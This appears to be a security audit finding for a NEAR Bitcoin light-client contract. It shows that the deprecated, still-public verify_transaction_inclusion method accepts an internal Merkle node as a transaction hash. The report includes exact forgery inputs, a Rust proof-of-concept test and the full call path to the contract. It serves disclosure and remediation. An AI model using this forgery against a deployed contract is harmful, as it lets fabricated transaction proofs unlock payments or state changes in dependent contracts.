Looking at the key functions in detail:

### Title
Internal-Node Merkle Proof Forgery via Deprecated `verify_transaction_inclusion` — (`contract/src/lib.rs`)

### Summary

`verify_transaction_inclusion` (v1) is a publicly callable NEAR contract method that passes the caller-supplied `tx_id` directly into `compute_root_from_merkle_proof` with no check that it is a leaf-level transaction hash. An unprivileged caller can supply a known internal node hash as `tx_id` with a proof that is one level shorter than the full tree depth, causing the function to recompute the correct merkle root and return `true` for a hash that is not a real transaction.

### Finding Description

`verify_transaction_inclusion` is marked `#[deprecated]` and carries an explicit `# Warning` comment acknowledging the weakness, but Rust's `#[deprecated]` attribute is a compiler lint only — it does not restrict runtime callability. The function remains `pub` and is gated only by `#[pause]`, meaning any unprivileged NEAR account can call it on an unpaused contract. [1](#0-0) 

The sole verification step is:

```rust
merkle_tools::compute_root_from_merkle_proof(
    args.tx_id,
    usize::try_from(args.tx_index).unwrap(),
    &args.merkle_proof,
) == header.block_header.merkle_root
```

`compute_root_from_merkle_proof` is a pure hash-climbing function with no awareness of tree depth or leaf position: [2](#0-1) 

It accepts any `H256` as the starting hash and iterates over however many proof elements are supplied. There is no minimum proof-length check, no tree-depth check, and no assertion that the starting hash must be a leaf.

### Impact Explanation

For a 4-transaction block with merkle tree:

```
         R = hash(H01, H23)
        /                  \
H01 = hash(tx0,tx1)   H23 = hash(tx2,tx3)
     /        \              /        \
   tx0        tx1          tx2        tx3
```

An attacker who knows `H01` and `H23` (both are public — they appear in any standard SPV proof for any leaf in the block) can call:

- `tx_id` = `H01`
- `tx_index` = `0`
- `merkle_proof` = `[H23]`

`compute_root_from_merkle_proof(H01, 0, [H23])` computes `hash(H01, H23) = R`, which equals `header.block_header.merkle_root`, so the function returns `true`. `H01` is not a transaction; it is an internal node. Any downstream contract that calls `verify_transaction_inclusion` to gate a payment or state transition will accept this fabricated "transaction inclusion" proof. [3](#0-2) 

### Likelihood Explanation

- No privileged role is required. Any NEAR account can call `verify_transaction_inclusion` directly.
- All inputs needed for the forgery (`H01`, `H23`, the block hash, the merkle root) are publicly available from any Bitcoin block explorer or from the block headers already stored in the contract.
- The contract is not paused by default; the `#[pause]` gate is an operational control, not a security boundary against this attack.
- The `#[deprecated]` attribute produces a Rust compiler warning but has zero effect on the deployed WASM binary.

### Recommendation

1. **Remove `verify_transaction_inclusion` (v1) entirely** from the public ABI, or mark it `#[private]` so it is only callable by the contract itself. The v2 function already exists and is the correct replacement.
2. If v1 must remain for backward compatibility, add a proof-length guard: require `merkle_proof.len()` to equal the expected tree depth derived from the block's transaction count (stored or passed in), so a one-level-short proof is rejected.
3. Enforce that `verify_transaction_inclusion_v2` is the only externally callable inclusion-verification entry point.

### Proof of Concept

Rust unit test (no privileged setup required, uses the same helpers already in `merkle-tools/src/lib.rs`):

```rust
#[test]
fn test_internal_node_forgery() {
    // 4-tx tree
    let tx0 = H256([1u8; 32]);
    let tx1 = H256([2u8; 32]);
    let tx2 = H256([3u8; 32]);
    let tx3 = H256([4u8; 32]);

    // Build the tree manually
    let h01 = compute_hash(&tx0, &tx1);   // internal node
    let h23 = compute_hash(&tx2, &tx3);   // internal node
    let root = compute_hash(&h01, &h23);  // merkle root

    // Forge: pass internal node h01 as "tx_id" with a 1-element proof [h23]
    let forged_root = compute_root_from_merkle_proof(
        h01.clone(),
        0,              // tx_index = 0
        &vec![h23],     // proof is one level shorter than full depth
    );

    // This assertion passes — the function returns the real merkle root
    // for an input that is NOT a leaf transaction
    assert_eq!(forged_root, root);
}
```

The real contract call path is: any NEAR account → `verify_transaction_inclusion` with `tx_id=H01`, `tx_index=0`, `merkle_proof=[H23]`, `tx_block_blockhash=<any mainchain block whose merkle_root=R>`, `confirmations=1` → returns `true`. [2](#0-1) [4](#0-3)

### Citations

**File:** contract/src/lib.rs (L277-323)
```rust
    /// # Warning
    /// This function may return `true` if the provided `tx_id` is a hash of an internal node in the Merkle tree rather than a valid transaction hash.
    /// We assume that validation of whether the `tx_id` corresponds to a valid transaction hash is performed at a higher level of verification.
    ///
    /// # Panics
    /// Multiple cases
    #[deprecated(
        since = "0.5.0",
        note = "Use `verify_transaction_inclusion_v2` instead."
    )]
    #[pause]
    pub fn verify_transaction_inclusion(&self, #[serializer(borsh)] args: ProofArgs) -> bool {
        require!(
            args.confirmations <= self.gc_threshold,
            "The required number of confirmations exceeds the number of blocks stored in memory"
        );

        let heaviest_block_header = self
            .headers_pool
            .get(&self.mainchain_tip_blockhash)
            .unwrap_or_else(|| env::panic_str(ERR_KEY_NOT_EXIST));
        let target_block_height = self
            .mainchain_header_to_height
            .get(&args.tx_block_blockhash)
            .unwrap_or_else(|| env::panic_str("block does not belong to the current main chain"));

        // Check requested confirmations. No need to compute proof if insufficient confirmations.
        require!(
            (heaviest_block_header.block_height).saturating_sub(target_block_height) + 1
                >= args.confirmations,
            "Not enough blocks confirmed"
        );

        let header = self
            .headers_pool
            .get(&args.tx_block_blockhash)
            .unwrap_or_else(|| env::panic_str("cannot find requested transaction block"));

        require!(!args.merkle_proof.is_empty(), "Merkle proof is empty");

        // compute merkle tree root and check if it matches block's original merkle tree root
        merkle_tools::compute_root_from_merkle_proof(
            args.tx_id,
            usize::try_from(args.tx_index).unwrap(),
            &args.merkle_proof,
        ) == header.block_header.merkle_root
    }
```

**File:** merkle-tools/src/lib.rs (L34-52)
```rust
pub fn compute_root_from_merkle_proof(
    transaction_hash: H256,
    transaction_position: usize,
    merkle_proof: &Vec<H256>,
) -> H256 {
    let mut current_hash = transaction_hash;
    let mut current_position = transaction_position;

    for proof_hash in merkle_proof {
        if current_position % 2 == 0 {
            current_hash = compute_hash(&current_hash, proof_hash);
        } else {
            current_hash = compute_hash(proof_hash, &current_hash);
        }
        current_position /= 2;
    }

    current_hash
}
```
